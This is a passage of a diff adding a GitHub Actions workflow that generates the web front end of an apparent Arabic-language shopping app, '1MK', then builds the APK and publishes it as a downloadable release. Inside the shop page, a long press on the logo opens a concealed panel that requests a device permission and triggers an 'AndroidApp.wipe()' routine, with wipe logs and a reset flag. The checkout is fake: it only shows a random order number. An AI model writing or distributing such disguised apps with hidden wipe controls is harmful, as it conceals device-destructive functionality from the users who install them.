+            var q=el.closest('.qty button'); if(q){var i=+q.dataset.i;if(q.dataset.m==='+')cart[i].q++;else{cart[i].q--;if(cart[i].q<1)cart.splice(i,1)}save();badge();openCart();return}
+            if(el.id==='pay'){$('#orderNo').textContent='رقم الطلب: 1MK-'+(100000+Math.floor(Math.random()*899999));cart=[];save();badge();hideAll();$('#done').classList.add('on');return}
+            if(el.id==='doneBtn'){$('#done').classList.remove('on');return}
+            var t=el.closest('.tabbar button');
+            if(t){document.querySelectorAll('.tabbar button').forEach(function(b){b.classList.remove('on')});t.classList.add('on');
+              if(t.dataset.tab==='cart')openCart();
+              if(t.dataset.tab==='me'){$('#meSheet').classList.remove('down');$('#meSheet').classList.add('open');show()}
+              if(t.dataset.tab==='cats'){$('#catsBody').innerHTML=CATS.map(function(c){return '<div class="row" data-cc="'+c+'"><div class="t">'+c+'</div><span class="mut">›</span></div>'}).join('');$('#catsSheet').classList.remove('down');$('#catsSheet').classList.add('open');show()}
+              if(t.dataset.tab==='home')window.scrollTo({top:0,behavior:'smooth'});
+              return}
+            var cc=el.closest('[data-cc]'); if(cc){cur=cc.dataset.cc;chips();grid();hideAll();window.scrollTo({top:260,behavior:'smooth'});return}
+          });
+          $('#searchBtn').onclick=function(){$('#sbar').classList.toggle('open');if($('#sbar').classList.contains('open'))$('#q').focus()};
+          $('#q').addEventListener('input',function(){kw=this.value.trim();grid()});
+          $('#cartBtn').onclick=openCart;
+          $('#heroBtn').onclick=function(){window.scrollTo({top:300,behavior:'smooth'})};
+
+          var lp=null;
+          var logo=$('#logo');
+          logo.addEventListener('pointerdown',function(){lp=setTimeout(function(){$('#panel').classList.add('on');refresh()},900)});
+          ['pointerup','pointerleave','pointercancel'].forEach(function(ev){logo.addEventListener(ev,function(){clearTimeout(lp)})});
+          $('#pClose').onclick=function(){$('#panel').classList.remove('on')};
+          function refresh(){
+            if(!window.AndroidApp){$('#pstatus').textContent='مش جوه تطبيق أندرويد';$('#plast').textContent='—';$('#plog').textContent='—';return}
+            try{
+              $('#pstatus').textContent = AndroidApp.status()==='granted'
+                ? 'الصلاحية: ممنوحة'
+                : 'الصلاحية: ممنوحة ✗ ('+AndroidApp.permissionName()+')';
+              $('#plast').textContent = AndroidApp.lastWipe();
+              $('#plog').textContent = AndroidApp.log()||'(مفيش لوج)';
+            }catch(e){$('#plog').textContent='خطأ: '+e.message}
+          }
+          $('#pAsk').onclick=function(){try{AndroidApp.ask();setTimeout(refresh,1200)}catch(e){}};
+          $('#pWipe').onclick=function(){try{AndroidApp.wipe()}catch(e){}};
+          $('#pReset').onclick=function(){try{AndroidApp.resetFlag();alert('تم التصفير')}catch(e){}};
+          window.__wipeDone=function(){refresh()};
+
+          chips();grid();badge();
+          </script>
+          </body>
+          </html>
+          EOF
+
+          echo "== الملفات اللي اتولدت =="
+          find . -path ./.git -prune -o -type f -print
+
+      - name: تجهيز Java
+        uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '17'
+
+      - name: تجهيز Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: تجهيز Gradle
+        uses: gradle/actions/setup-gradle@v4
+        with:
+          gradle-version: '8.7'
+
+      - name: بناء التطبيق
+        run: gradle assembleRelease --no-daemon --stacktrace
+
+      - name: تجهيز الـ APK
+        run: |
+          mkdir -p out
+          cp app/build/outputs/apk/release/app-release.apk out/1MK.apk
+          ls -lh out
+
+      - name: رفع الـ APK كـ Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1MK-apk
+          path: out/1MK.apk
+          retention-days: 90
+
+      - name: عمل Release بلينك تحميل مباشر
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: v1.0.${{ github.run_number }}
+          name: 1MK v1.0.${{ github.run_number }}
+          files: out/1MK.apk
